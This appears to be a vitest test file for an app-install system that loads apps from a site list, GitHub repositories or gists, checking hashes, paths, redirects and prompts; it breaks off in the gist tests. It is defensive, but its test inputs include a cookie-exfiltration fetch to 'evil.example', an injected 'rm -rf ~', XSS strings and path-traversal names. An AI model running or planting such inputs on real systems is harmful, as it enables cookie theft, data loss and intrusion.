/**
 * App links and where apps come from (src/apps/links.ts, docs/APPS.md
 * "Links"): what `?app=` names, which apps install without asking, what an
 * attacker-made link or repository can and can't do, and that the site's own
 * app list matches the files in the repository.
 */
import { describe, it, expect } from 'vitest';
import { createHash } from 'node:crypto';
import { readFileSync, mkdtempSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import {
  parseAppSpec, parseAppUrl, appLinkQuery, fetchSiteApp, fetchGhApp, fetchGistApp, archiveApp, handleAppLink, AppLinkError,
  type AppLinkDeps, type FetchedApp, type InstallChoice,
} from '@shiro/apps/links';
import { cleanRunUrl, RunLinkError } from '@shiro/run-url';
import { appOriginLabel } from '@shiro/apps/frame';
import { parseManifest } from '@shiro/apps/manifest';
// @ts-expect-error a plain .mjs script
import { siteApps, writeSiteApps } from '../../../scripts/apps/site-apps.mjs';

const ROOT = resolve(__dirname, '../../..');
const ORIGIN = 'https://tabcomputer.com';
const sha = (s: string | Uint8Array) => createHash('sha256').update(s).digest('hex');
const enc = (s: string) => new TextEncoder().encode(s);
const MANIFEST = JSON.stringify({ manifest: 1, id: 'demo', name: 'Demo', entry: 'public', access: { commands: ['zip'] } });
const FILES: Record<string, string> = { 'app.json': MANIFEST, 'public/index.html': '<!doctype html><h1>demo</h1>', 'public/app.js': 'console.log(1)' };
const refused = (fn: () => unknown) => { try { fn(); } catch (e) { return e instanceof RunLinkError ? e.message : 'threw'; } return ''; };

function site(files: Record<string, string | (() => Response)>) {
  const calls: { url: string; init?: RequestInit }[] = [];
  const fetchFn = async (url: string, init?: RequestInit) => {
    calls.push({ url, init });
    const body = files[url];
    if (body === undefined) return new Response('Not found', { status: 404, headers: { 'content-type': 'text/plain' } });
    if (typeof body === 'function') return body();
    return new Response(body, { status: 200, headers: { 'content-type': url.endsWith('.json') ? 'application/json' : url.endsWith('.html') && url.startsWith(ORIGIN) ? 'text/html' : 'text/plain' } });
  };
  return { fetchFn, calls };
}
const indexOf = (id: string, files: Record<string, string>) => JSON.stringify({ format: 1, apps: [{ id, files: Object.entries(files).map(([path, text]) => ({ path, sha256: sha(text), size: text.length })) }] });
const curated = (extra: Record<string, string | (() => Response)> = {}, files = FILES) => site({
  [`${ORIGIN}/apps/index.json`]: indexOf('demo', files),
  ...Object.fromEntries(Object.entries(files).map(([p, t]) => [`${ORIGIN}/apps/demo/${p}`, t])),
  ...extra,
});

const COMMIT = 'c0ffee'.padEnd(40, '0');
const ghSite = (files: Record<string, string> = FILES, extra: Record<string, string | (() => Response)> = {}, tree?: unknown[]) => site({
  'https://api.github.com/repos/someone/tool/commits/HEAD': COMMIT,
  [`https://api.github.com/repos/someone/tool/git/trees/${COMMIT}?recursive=1`]: JSON.stringify({ tree: tree ?? Object.keys(files).map((path) => ({ path, type: 'blob', mode: '100644', size: files[path].length })) }),
  ...Object.fromEntries(Object.entries(files).map(([p, t]) => [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/${p}`, t])),
  ...extra,
});

describe('app links: what the address names', () => {
  it('an id is an app of this site; gh: a folder of a repository; an archive only for app install', () => {
    expect(parseAppSpec('converter')).toEqual({ kind: 'site', id: 'converter' });
    expect(parseAppSpec('gh:Some-One/My.Repo')).toEqual({ kind: 'gh', owner: 'Some-One', repo: 'My.Repo', path: '' });
    expect(parseAppSpec('gh:o/r/apps/notes')).toEqual({ kind: 'gh', owner: 'o', repo: 'r', path: 'apps/notes' });
    expect(parseAppSpec('https://example.com/dl/app-1.2.zip')).toEqual({ kind: 'url', url: 'https://example.com/dl/app-1.2.zip' });
    expect(parseAppSpec('https://example.com/a.tar.gz?token=1').kind).toBe('url');
    expect(parseAppSpec('http://localhost:8000/a.tgz').kind).toBe('url');
    expect(parseAppUrl('?ui=desktop')).toBeNull();
    expect(parseAppUrl('?app=converter')).toEqual({ target: { kind: 'site', id: 'converter' }, become: false });
    expect(parseAppUrl('?app=gh:o/r/x&become')).toEqual({ target: { kind: 'gh', owner: 'o', repo: 'r', path: 'x' }, become: true });
    expect(parseAppUrl('?app=converter&become=0')!.become).toBe(false);
    // an address never names an archive: only something typed does
    expect(refused(() => parseAppUrl('?app=https://example.com/a.zip'))).toMatch(/an app link names an app of this site, gh:/);
  });

  it('refuses names that could reach another file or host', () => {
    for (const bad of ['', 'Converter', '../converter', 'converter/../x', 'a/b', '.hidden', 'x', 'conv erter', 'converter?x', 'terminal', 'api', 'apps', 'guest',
      'gh:', 'gh:o', 'gh:o/', 'gh:/r', 'gh:o/..', 'gh:o/r/..', 'gh:o/r/a/../../b', 'gh:o/r/a//b', 'gh:o/r/a/./b', 'gh:o/r/a%2f..', 'gh:o/r/a\\b', 'gh:o@evil.example/r', 'gh:o:8080/r', 'gh:-o/r',
      'gh:o/r/' + 'a/'.repeat(13) + 'x', 'sh:ZWNobyBoaQ', 'file:///etc/passwd', 'javascript:alert(1)', 'data:text/html,x',
    ]) expect(refused(() => parseAppSpec(bad)), bad).not.toBe('');
    for (const bad of ['http://example.com/a.zip', 'https://user:pw@example.com/a.zip', 'https://example.com/a.zip.exe', 'https://example.com/', 'ftp://example.com/a.zip', 'https://']) {
      expect(refused(() => parseAppSpec(bad)), bad).not.toBe('');
    }
    // what a refusal says has nothing from the link in it
    expect(refused(() => parseAppSpec('<img src=x onerror=alert(1)>'))).toBe('no such app (an app is an id, gh:<owner>/<repo>[/<path>], gist:<id>, or the address of an archive)');
  });

  it('the address loses the link and keeps the page\'s own parameters', () => {
    expect(cleanRunUrl('https://tabcomputer.com/?ui=desktop&app=gh:o/r&become&utm=1#x')).toBe('https://tabcomputer.com/?ui=desktop#x');
    expect(cleanRunUrl('https://tabcomputer.com/?app=converter&safe=1')).toBe('https://tabcomputer.com/?safe=1');
    expect(appLinkQuery({ kind: 'gh', owner: 'o', repo: 'r', path: 'a/b' }, { become: '1', evil: 'x' })).toBe('?app=gh:o/r/a/b&become=1');
    expect(appLinkQuery({ kind: 'site', id: 'converter' })).toBe('?app=converter');
  });
});

describe('app links: which apps are curated', () => {
  it('an app of this site is curated when the list has every file\'s hash', async () => {
    const { fetchFn, calls } = curated();
    const app = await fetchSiteApp('demo', ORIGIN, fetchFn);
    expect(app).toMatchObject({ curated: true, source: 'site', from: 'tabcomputer.com/apps/demo/', manifestText: MANIFEST });
    expect(app.manifest.id).toBe('demo');
    for (const c of calls) expect(c.init).toMatchObject({ redirect: 'error', credentials: 'same-origin' });
    const files = await app.files();
    expect([...files.keys()].sort()).toEqual(['app.json', 'public/app.js', 'public/index.html']);
    expect(new TextDecoder().decode(files.get('public/index.html'))).toBe(FILES['public/index.html']);
  });

  const cases: [string, Record<string, string | (() => Response)>, RegExp][] = [
    ['an app that is not in the list', { [`${ORIGIN}/apps/index.json`]: indexOf('other', FILES) }, /no such app/],
    ['a site without a list', { [`${ORIGIN}/apps/index.json`]: () => new Response('nope', { status: 404 }) }, /ships no apps/],
    ['the app shell standing in for the list', { [`${ORIGIN}/apps/index.json`]: () => new Response('<!doctype html>', { status: 200, headers: { 'content-type': 'text/html' } }) }, /ships no apps/],
    ['a list that is not JSON', { [`${ORIGIN}/apps/index.json`]: 'oops' }, /could not read the app list/],
    ['a file changed after the list was made', { [`${ORIGIN}/apps/demo/public/app.js`]: 'fetch("https://evil.example/"+document.cookie)' }, /does not match the app list/],
    ['a manifest changed after the list was made', { [`${ORIGIN}/apps/demo/app.json`]: MANIFEST.replace('zip', 'sh') }, /does not match the app list/],
    ['a missing file', { [`${ORIGIN}/apps/demo/public/app.js`]: () => new Response('nope', { status: 404 }) }, /is missing/],
    ['a redirected file', { [`${ORIGIN}/apps/demo/public/app.js`]: () => Object.defineProperty(new Response(FILES['public/app.js'], { status: 200 }), 'redirected', { value: true }) }, /was redirected/],
    ['the app shell standing in for a script', { [`${ORIGIN}/apps/demo/public/app.js`]: () => new Response(FILES['public/app.js'], { status: 200, headers: { 'content-type': 'text/html' } }) }, /is missing/],
  ];
  for (const [what, over, why] of cases) {
    it(`refuses ${what}`, async () => {
      const { fetchFn } = curated(over);
      await expect((async () => (await fetchSiteApp('demo', ORIGIN, fetchFn)).files())()).rejects.toThrow(why);
    });
  }

  it('refuses a list that names a path outside the app, or another app\'s manifest', async () => {
    for (const path of ['../other/app.js', '/etc/passwd', 'a/../../b', 'a\\b', 'a//b', './x']) {
      const files = { ...FILES, [path]: 'x' };
      const { fetchFn } = site({ [`${ORIGIN}/apps/index.json`]: indexOf('demo', files), [`${ORIGIN}/apps/demo/app.json`]: MANIFEST });
      await expect((async () => (await fetchSiteApp('demo', ORIGIN, fetchFn)).files())(), path).rejects.toThrow(/not a plain path/);
    }
    const other = { ...FILES, 'app.json': MANIFEST.replace('"demo"', '"other"') };
    const { fetchFn } = site({ [`${ORIGIN}/apps/index.json`]: indexOf('demo', other), [`${ORIGIN}/apps/demo/app.json`]: other['app.json'] });
    await expect(fetchSiteApp('demo', ORIGIN, fetchFn)).rejects.toThrow(/names another id/);
    for (const id of ['../x', 'terminal', 'A', 'a/b']) await expect(fetchSiteApp(id, ORIGIN, curated().fetchFn)).rejects.toThrow(/no such app/);
  });

  it('gh: reads one commit, without cookies or a referrer, and is never curated', async () => {
    const { fetchFn, calls } = ghSite();
    const app = await fetchGhApp({ owner: 'someone', repo: 'tool', path: '' }, fetchFn);
    expect(app).toMatchObject({ curated: false, source: `gh:someone/tool@${COMMIT}`, from: `github.com/someone/tool at commit ${COMMIT.slice(0, 10)}`, manifestText: MANIFEST });
    expect(calls.map((c) => c.url)).toEqual(['https://api.github.com/repos/someone/tool/commits/HEAD', `https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]);
    for (const c of calls) expect(c.init).toMatchObject({ redirect: 'error', credentials: 'omit', referrerPolicy: 'no-referrer' });
    const files = await app.files();
    expect([...files.keys()].sort()).toEqual(['app.json', 'public/app.js', 'public/index.html']);
    // every file came from that commit, never from a branch name
    expect(calls.every((c) => c.url.startsWith('https://api.github.com/repos/someone/tool/') || c.url.startsWith(`https://raw.githubusercontent.com/someone/tool/${COMMIT}/`))).toBe(true);
    // the manifest is the one that was shown: not fetched a second time
    expect(calls.filter((c) => c.url.endsWith('/app.json'))).toHaveLength(1);
    // a repository named like this site's app is still not curated
    expect((await fetchGhApp({ owner: 'someone', repo: 'tool', path: '' }, ghSite({ ...FILES, 'app.json': MANIFEST.replace('"demo"', '"converter"') }).fetchFn)).curated).toBe(false);
  });

  it('gh: an app with a page of its own may leave entry out, as in a folder or a gist: the page is the index.html beside app.json or in public/', async () => {
    const bare = JSON.stringify({ name: 'Demo' });
    // index.html in public/: the file list is read once, for the page and again for the install
    const inPublic = ghSite({ ...FILES, 'app.json': bare });
    const a = await fetchGhApp({ owner: 'someone', repo: 'tool', path: '' }, inPublic.fetchFn);
    expect(a.manifest).toMatchObject({ id: 'tool', kind: 'page', entry: 'public' });
    expect(a.manifestText).toBe(bare);
    expect([...(await a.files()).keys()].sort()).toEqual(['app.json', 'public/app.js', 'public/index.html']);
    expect(inPublic.calls.filter((c) => c.url.includes('/git/trees/'))).toHaveLength(1);
    // index.html beside app.json
    const beside = await fetchGhApp({ owner: 'someone', repo: 'tool', path: '' }, ghSite({ 'app.json': bare, 'index.html': '<h1>x</h1>' }).fetchFn);
    expect(beside.manifest.entry).toBe('.');
    // no page anywhere: the manifest's own mistake is named, as before
    await expect(fetchGhApp({ owner: 'someone', repo: 'tool', path: '' }, ghSite({ 'app.json': bare, 'notes.txt': 'x' }).fetchFn)).rejects.toThrow(/entry is missing/);
    // an app.json that names its page, or is the whole app, asks for no file list before the prompt
    const whole = ghSite({ 'app.json': JSON.stringify({ name: 'Tidy', run: 'jq . {in}' }) });
    expect((await fetchGhApp({ owner: 'someone', repo: 'tool', path: '' }, whole.fetchFn)).manifest.kind).toBe('files');
    expect(whole.calls.some((c) => c.url.includes('/git/trees/'))).toBe(false);
  });

  it('gh: a subfolder is the app; links, submodules and the repository\'s own metadata are left out', async () => {
    const tree = [
      { path: 'README.md', type: 'blob', mode: '100644', size: 3 }, { path: 'apps', type: 'tree', mode: '040000' },
      { path: 'apps/demo/app.json', type: 'blob', mode: '100644', size: 10 }, { path: 'apps/demo/public/index.html', type: 'blob', mode: '100644', size: 10 },
      { path: 'apps/demo/public/app.js', type: 'blob', mode: '100644', size: 10 }, { path: 'apps/demo/link-to-home', type: 'blob', mode: '120000', size: 10 },
      { path: 'apps/demo/vendor', type: 'commit', mode: '160000' }, { path: 'apps/demo/.github/workflows/x.yml', type: 'blob', mode: '100644', size: 1 },
      { path: 'apps/demo2/app.json', type: 'blob', mode: '100644', size: 10 }, { path: 'apps/demonstration.txt', type: 'blob', mode: '100644', size: 1 },
    ];
    const { fetchFn } = site({
      'https://api.github.com/repos/someone/tool/commits/HEAD': COMMIT,
      [`https://api.github.com/repos/someone/tool/git/trees/${COMMIT}?recursive=1`]: JSON.stringify({ tree }),
      ...Object.fromEntries(Object.entries(FILES).map(([p, t]) => [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/apps/demo/${p}`, t])),
    });
    const app = await fetchGhApp({ owner: 'someone', repo: 'tool', path: 'apps/demo' }, fetchFn);
    expect(app.from).toBe(`github.com/someone/tool, apps/demo at commit ${COMMIT.slice(0, 10)}`);
    expect(app.source).toBe(`gh:someone/tool/apps/demo@${COMMIT}`);
    expect([...(await app.files()).keys()].sort()).toEqual(['app.json', 'public/app.js', 'public/index.html']);
  });

  const ghCases: [string, Record<string, string | (() => Response)>, unknown[] | undefined, RegExp][] = [
    ['a repository that does not exist', { 'https://api.github.com/repos/someone/tool/commits/HEAD': () => new Response('{}', { status: 404 }) }, undefined, /does not exist, or it is private: a private repository needs a GitHub sign-in/],
    ['a head that is not a commit', { 'https://api.github.com/repos/someone/tool/commits/HEAD': 'main; rm -rf ~' }, undefined, /could not read the head commit/],
    ['a head that is a branch name', { 'https://api.github.com/repos/someone/tool/commits/HEAD': '../../other/repo/main' }, undefined, /could not read the head commit/],
    ['a folder without app.json', { [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]: () => new Response('404', { status: 404 }) }, undefined, /has no app\.json: it is not an app/],
    ['a manifest that is not valid', { [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]: '{"manifest":1,"id":"files","name":"x","entry":"p"}' }, undefined, /manifest is not valid:\napp\.json: id "files" is taken/],
    ['a manifest that is an HTML page', { [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]: () => new Response('<html>', { status: 200, headers: { 'content-type': 'text/html' } }) }, undefined, /a web page, not a file/],
    ['a redirected manifest', { [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]: () => Object.defineProperty(new Response(MANIFEST, { status: 200 }), 'url', { value: 'https://evil.example/app.json' }) }, undefined, /was redirected/],
    ['a manifest with a hidden character', { [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]: MANIFEST.replace('Demo', 'De\u202emo') }, undefined, /name must be/],
    ['a file list that was cut short', { [`https://api.github.com/repos/someone/tool/git/trees/${COMMIT}?recursive=1`]: JSON.stringify({ truncated: true, tree: [] }) }, undefined, /too many files to list/],
    ['a file whose name is a path trick', {}, [{ path: 'app.json', type: 'blob', mode: '100644' }, { path: 'public/../../../.claude/settings.json', type: 'blob', mode: '100644' }], /not a plain path/],
    ['a file with a control character in its name', {}, [{ path: 'app.json', type: 'blob', mode: '100644' }, { path: 'public/a\u0007b.js', type: 'blob', mode: '100644' }], /not a plain path/],
    ['an app with too many files', {}, [{ path: 'app.json', type: 'blob', mode: '100644' }, ...Array.from({ length: 401 }, (_, i) => ({ path: `f${i}.txt`, type: 'blob', mode: '100644', size: 1 }))], /too large to install/],
    ['an app that is too large', {}, [{ path: 'app.json', type: 'blob', mode: '100644' }, { path: 'big.bin', type: 'blob', mode: '100644', size: 64 << 20 }], /too large to install/],
    ['a file that vanished', { [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/public/app.js`]: () => new Response('404', { status: 404 }) }, undefined, /is missing/],
  ];
  for (const [what, over, tree, why] of ghCases) {
    it(`gh: refuses ${what}`, async () => {
      const { fetchFn } = ghSite(FILES, over, tree);
      await expect((async () => (await fetchGhApp({ owner: 'someone', repo: 'tool', path: '' }, fetchFn)).files())()).rejects.toThrow(why);
    });
  }

  it('gh: a target the parser did not make is refused before any fetch', async () => {
    const { fetchFn, calls } = ghSite();
    for (const t of [{ owner: '../..', repo: 'r', path: '' }, { owner: 'o', repo: '..', path: '' }, { owner: 'o', repo: 'r', path: '../x' }, { owner: 'o', repo: 'r', path: 'a//b' }, { owner: 'o@evil', repo: 'r', path: '' }]) {
      await expect(fetchGhApp(t, fetchFn)).rejects.toThrow(/no such app/);
    }
    expect(calls).toEqual([]);
  });

  it('an archive: app.json at its top or in its one folder; plain paths only', async () => {
    const top = new Map(Object.entries(FILES).map(([p, t]) => [p, enc(t)]));
    const a = archiveApp(top, 'https://example.com/dl/demo.zip');
    expect(a).toMatchObject({ curated: false, source: 'url:https://example.com/dl/demo.zip', from: 'example.com/dl/demo.zip' });
    expect([...(await a.files()).keys()].sort()).toEqual(['app.json', 'public/app.js', 'public/index.html']);
    const nested = new Map(Object.entries(FILES).map(([p, t]) => [`demo-1.0/${p}`, enc(t)]));
    expect([...(await archiveApp(nested, 'https://example.com/x.tgz').files()).keys()].sort()).toEqual(['app.json', 'public/app.js', 'public/index.html']);
    expect(() => archiveApp(new Map([['a/app.json', enc(MANIFEST)], ['b/x', enc('x')]]), 'https://e.com/x.zip')).toThrow(/no app\.json at its top/);
    expect(() => archiveApp(new Map([['x.txt', enc('x')]]), 'https://e.com/x.zip')).toThrow(/no app\.json at its top/);
    expect(() => archiveApp(new Map([['app.json', enc(MANIFEST)], ['../../evil', enc('x')]]), 'https://e.com/x.zip')).toThrow(/not a plain path/);
    expect(() => archiveApp(new Map([['app.json', enc('{}')]]), 'https://e.com/x.zip')).toThrow(/manifest is not valid/);
  });
});

function harness(search: string, fetchFn: AppLinkDeps['fetch'], answer: InstallChoice = 'cancel', over: Partial<AppLinkDeps> = {}) {
  const log = { cleaned: 0, prompts: [] as FetchedApp[], installs: [] as { app: FetchedApp; files: Map<string, Uint8Array> }[], opens: [] as [string, boolean][], guests: [] as string[], reports: [] as string[] };
  const sources = new Map<string, string>();
  const deps: AppLinkDeps = {
    search, origin: ORIGIN, framed: false, fetch: fetchFn,
    cleanUrl: () => { log.cleaned++; },
    installedSource: async (id) => sources.get(id) ?? null,
    confirm: async (app) => { log.prompts.push(app); return answer; },
    install: async (app, files) => { log.installs.push({ app, files }); sources.set(app.manifest.id, app.source); },
    open: async (id, become) => { log.opens.push([id, become]); },
    openInGuest: async (query) => { log.guests.push(query); return true; },
    report: (m) => { log.reports.push(m); },
    ...over,
  };
  return { deps, log, sources };
}

describe('app links: the trust decision', () => {
  it('an app of this site installs and opens at once, without a prompt', async () => {
    const h = harness('?app=demo&utm_source=mail', curated().fetchFn);
    expect(await handleAppLink(h.deps)).toBe('installed');
    expect(h.log.prompts).toEqual([]);
    expect(h.log.cleaned).toBe(1);
    expect(h.log.installs).toHaveLength(1);
    expect([...h.log.installs[0].files.keys()].sort()).toEqual(['app.json', 'public/app.js', 'public/index.html']);
    expect(h.log.opens).toEqual([['demo', false]]);
    // the next load only opens it
    expect(await handleAppLink(h.deps)).toBe('opened');
    expect(h.log.installs).toHaveLength(1);
    expect(h.log.opens).toHaveLength(2);
  });

  it('&become makes the tab the app', async () => {
    const h = harness('?app=demo&become', curated().fetchFn);
    await handleAppLink(h.deps);
    expect(h.log.opens).toEqual([['demo', true]]);
  });

  it('gh: asks first; Cancel installs, fetches and opens nothing more', async () => {
    const gh = ghSite();
    const h = harness('?app=gh:someone/tool', gh.fetchFn, 'cancel');
    expect(await handleAppLink(h.deps)).toBe('cancelled');
    expect(h.log.cleaned).toBe(1);
    expect(h.log.prompts).toHaveLength(1);
    expect(h.log.prompts[0]).toMatchObject({ manifestText: MANIFEST, from: `github.com/someone/tool at commit ${COMMIT.slice(0, 10)}` });
    expect(h.log.installs).toEqual([]);
    expect(h.log.opens).toEqual([]);
    expect(gh.calls.map((c) => c.url)).toEqual(['https://api.github.com/repos/someone/tool/commits/HEAD', `https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]);
  });

  it('Install installs exactly the manifest that was shown, from the commit that was shown', async () => {
    let manifestFetches = 0;
    const gh = ghSite(FILES, {
      // a repository that answers differently the second time: the manifest is not asked for again
      [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/app.json`]: () => new Response(manifestFetches++ ? MANIFEST.replace('zip', 'sh') : MANIFEST, { status: 200 }),
    });
    const h = harness('?app=gh:someone/tool', gh.fetchFn, 'install');
    expect(await handleAppLink(h.deps)).toBe('installed');
    expect(manifestFetches).toBe(1);
    const { app, files } = h.log.installs[0];
    expect(new TextDecoder().decode(files.get('app.json'))).toBe(h.log.prompts[0].manifestText);
    expect(parseManifest(files.get('app.json')!).access.commands).toEqual(['zip']);
    expect(app.source).toBe(`gh:someone/tool@${COMMIT}`);
    expect(h.log.opens).toEqual([['demo', false]]);
  });

  it('the same commit again opens without asking; a new commit asks again', async () => {
    const h = harness('?app=gh:someone/tool', ghSite().fetchFn, 'install');
    await handleAppLink(h.deps);
    expect(await handleAppLink(h.deps)).toBe('opened');
    expect(h.log.prompts).toHaveLength(1);
    h.sources.set('demo', `gh:someone/tool@${'b'.repeat(40)}`);
    expect(await handleAppLink(h.deps)).toBe('installed');
    expect(h.log.prompts).toHaveLength(2);
    // an app of that id installed from somewhere else is not this app: asked again, too
    h.sources.set('demo', 'dir:/home/user/src/demo');
    await handleAppLink(h.deps);
    expect(h.log.prompts).toHaveLength(3);
  });

  it('"Open in a guest" sends the same link there and installs nothing here', async () => {
    const h = harness('?app=gh:someone/tool/sub&become&extra=1', ghSite(FILES, Object.fromEntries(Object.entries(FILES).map(([p, t]) => [`https://raw.githubusercontent.com/someone/tool/${COMMIT}/sub/${p}`, t]))).fetchFn, 'guest');
    expect(await handleAppLink(h.deps)).toBe('guest');
    expect(h.log.guests).toEqual(['?app=gh:someone/tool/sub&become=1']);
    expect(h.log.installs).toEqual([]);
    expect(h.log.opens).toEqual([]);
    const none = harness('?app=gh:someone/tool', ghSite().fetchFn, 'guest', { openInGuest: async () => false });
    expect(await handleAppLink(none.deps)).toBe('refused');
    expect(none.log.reports[0]).toMatch(/no guests/);
  });

  it('refuses, cleans the address and says why', async () => {
    const cases: [string, Partial<AppLinkDeps>, RegExp][] = [
      ['?app=../../etc/passwd', {}, /no such app/],
      ['?app=', {}, /no such app/],
      ['?app=gh:o/r/../x', {}, /path may only/],
      ['?app=https://example.com/a.zip', {}, /an app link names/],
      ['?app=nothere', {}, /no such app/],
      ['?app=demo', { framed: true }, /ignored inside a frame/],
      ['?app=demo', { fetch: async () => { throw new TypeError('Failed to fetch'); } }, /could not fetch the app list/],
    ];
    for (const [search, over, why] of cases) {
      const h = harness(search, curated().fetchFn, 'install', over);
      expect(await handleAppLink(h.deps), search).toBe('refused');
      expect(h.log.cleaned, search).toBe(1);
      expect(h.log.reports[0], search).toMatch(why);
      expect(h.log.installs).toEqual([]);
      expect(h.log.opens).toEqual([]);
    }
    const none = harness('?ui=desktop', curated().fetchFn);
    expect(await handleAppLink(none.deps)).toBe('none');
    expect(none.log.cleaned).toBe(0);
    expect(new AppLinkError('x')).toBeInstanceOf(RunLinkError);
  });

  it('an install that fails is reported and nothing is opened', async () => {
    const h = harness('?app=demo', curated().fetchFn, 'install', { install: async () => { throw new AppLinkError('the id demo belongs to an app that is built in'); } });
    expect(await handleAppLink(h.deps)).toBe('refused');
    expect(h.log.reports[0]).toMatch(/built in/);
    expect(h.log.opens).toEqual([]);
  });
});

describe('app origins', () => {
  it('a label per app, per source and per tab host; never a browse key, never a guest', async () => {
    const a = await appOriginLabel('converter', 'site', 'tabcomputer.com');
    expect(a).toMatch(/^app--converter--[0-9a-f]{16}$/);
    expect(await appOriginLabel('converter', 'site', 'tabcomputer.com')).toBe(a);
    expect(await appOriginLabel('converter', 'gh:evil/converter@abc', 'tabcomputer.com')).not.toBe(a);
    expect(await appOriginLabel('converter', 'site', 'guest--x.tabcomputer.com')).not.toBe(a);
    const dashed = await appOriginLabel('my-long-app-name-with-many-dashes-x', 'site', 'h');
    // no single dash (a browse key's dot) and short enough for a DNS label
    expect(dashed).toMatch(/^app--[a-z0-9]{1,24}--[0-9a-f]{16}$/);
    expect(dashed.length).toBeLessThanOrEqual(63);
    expect(dashed.replace(/--/g, '')).not.toContain('-');
  });
});

describe('the apps this site ships', () => {
  it('converter is listed with every file\'s hash, and nothing that only measures or documents it', () => {
    const apps = siteApps(ROOT) as { id: string; files: { path: string; sha256: string; size: number }[] }[];
    const conv = apps.find((a) => a.id === 'converter')!;
    expect(conv).toBeTruthy();
    expect(apps.some((a) => a.id === 'templates')).toBe(false);
    const paths = conv.files.map((f) => f.path);
    expect(paths).toEqual(expect.arrayContaining(['app.json', 'public/index.html', 'public/app.js', 'public/icon.svg']));
    expect(paths.some((p) => p.startsWith('measure/') || p === 'README.md' || p.startsWith('.'))).toBe(false);
    for (const f of conv.files) expect(f.sha256, f.path).toBe(sha(readFileSync(join(ROOT, 'apps/converter', f.path))));
    parseManifest(readFileSync(join(ROOT, 'apps/converter/app.json')));
  });

  it('what a build writes is what the page accepts as curated', async () => {
    const out = mkdtempSync(join(tmpdir(), 'tc-apps-'));
    writeSiteApps(out, ROOT);
    expect(existsSync(join(out, 'apps/index.json'))).toBe(true);
    const fetchFn = async (url: string) => {
      const file = join(out, new URL(url).pathname);
      if (!existsSync(file)) return new Response('Not found', { status: 404, headers: { 'content-type': 'text/plain' } });
      return new Response(readFileSync(file), { status: 200, headers: { 'content-type': file.endsWith('.html') ? 'text/html' : file.endsWith('.json') ? 'application/json' : 'application/octet-stream' } });
    };
    const app = await fetchSiteApp('converter', ORIGIN, fetchFn);
    expect(app.curated).toBe(true);
    const files = await app.files();
    expect(files.has('public/index.html')).toBe(true);
    expect(files.has('measure/lib.mjs')).toBe(false);
  });
});

describe('apps from a gist (tabcomputer#137)', () => {
  const ID = 'abcdef0123456789abcdef0123456789';
  const REV = 'beef'.padEnd(40, '1');
  const ONE = '{\n  "name": "Tidy JSON",\n  "accept": [".json"],\n  "run": "jq . {in}"\n}\n';
  const gistSite = (files: Record<string, string | { truncated: true }>, extra: Record<string, string | (() => Response)> = {}, over: Record<string, unknown> = {}) => site({
    [`https://api.github.com/gists/${ID}`]: JSON.stringify({
      id: ID, owner: { login: 'octocat' }, history: [{ version: REV }, { version: 'a'.repeat(40) }],
      files: Object.fromEntries(Object.entries(files).map(([n, c]) => [n, typeof c === 'string' ? { filename: n, content: c, truncated: false } : { filename: n, content: 'cut sh', truncated: true }])),
      ...over,
    }),
    ...extra,
  });

  it('gist:<id> and gist:<user>/<id> name one, in an address and at the prompt', () => {
    expect(parseAppSpec(`gist:${ID}`)).toEqual({ kind: 'gist', user: '', id: ID });
    expect(parseAppSpec(`gist:Octo-Cat/${ID}`)).toEqual({ kind: 'gist', user: 'Octo-Cat', id: ID });
    expect(parseAppUrl(`?app=gist:${ID}&become`)).toEqual({ target: { kind: 'gist', user: '', id: ID }, become: true });
    expect(appLinkQuery({ kind: 'gist', user: '', id: ID })).toBe(`?app=gist:${ID}`);
    expect(appLinkQuery({ kind: 'gist', user: 'octocat', id: ID }, { become: '1' })).toBe(`?app=gist:octocat/${ID}&become=1`);
    expect(cleanRunUrl(`${ORIGIN}/?app=gist:${ID}&ui=desktop`)).toBe(`${ORIGIN}/?ui=desktop`);
    for (const bad of ['gist:', 'gist:/', `gist:/${ID}`, 'gist:octocat/', `gist:octocat/${ID}/app.json`, `gist:octocat/${ID}/`, `gist:../${ID}`, `gist:octocat/../${ID}`, `gist:${ID.toUpperCase()}`,
      'gist:not-hex', 'gist:abc', `gist:${'a'.repeat(41)}`, `gist:octocat@evil.example/${ID}`, `gist:evil.example/${ID}`, `gist:-octocat/${ID}`, `gist:${ID}?x=1`, `gist:${ID}#x`, `gist:o/${ID} `]) {
      expect(refused(() => parseAppSpec(bad)), bad).toMatch(/a gist: app is gist:<id> or gist:<user>\/<id>/);
    }
  });

  it('one app.json is a whole app, read at one revision: what is shown is what is installed', async () => {
    const { fetchFn, calls } = gistSite({ 'app.json': ONE, 'README.md': '# Tidy' });
    const app = await fetchGistApp({ user: '', id: ID }, fetchFn);
    // one request gave the revision and the files together
    expect(calls.map((c) => c.url)).toEqual([`https://api.github.com/gists/${ID}`]);
    expect(calls[0].init).toMatchObject({ redirect: 'error', credentials: 'omit' });
    expect(app).toMatchObject({ curated: false, source: `gist:${ID}@${REV}`, from: `gist.github.com/${ID} at revision ${REV.slice(0, 10)}`, manifestText: ONE });
    // the id comes from the app's name: a gist has no folder to name it
    expect(app.manifest).toMatchObject({ id: 'tidy-json', name: 'Tidy JSON', kind: 'files', run: 'jq . {in}', access: { commands: ['jq'], network: false } });
    const files = await app.files();
    expect([...files.keys()].sort()).toEqual(['README.md', 'app.json']);
    expect(new TextDecoder().decode(files.get('app.json'))).toBe(ONE);
    expect(calls).toHaveLength(1);
  });

  it('a gist with a page: its files are the app\'s, flat, and entry may be left out', async () => {
    const { fetchFn } = gistSite({ 'app.json': '{"name": "Flat page"}', 'index.html': '<!doctype html><script src="app.js"></script>', 'app.js': '1', 'style.css': 'b{}' });
    const app = await fetchGistApp({ user: 'octocat', id: ID }, fetchFn);
    expect(app.manifest).toMatchObject({ kind: 'page', entry: '.', id: 'flat-page' });
    expect(app.from).toBe(`gist.github.com/octocat/${ID} at revision ${REV.slice(0, 10)}`);
    expect([...(await app.files()).keys()].sort()).toEqual(['app.js', 'app.json', 'index.html', 'style.css']);
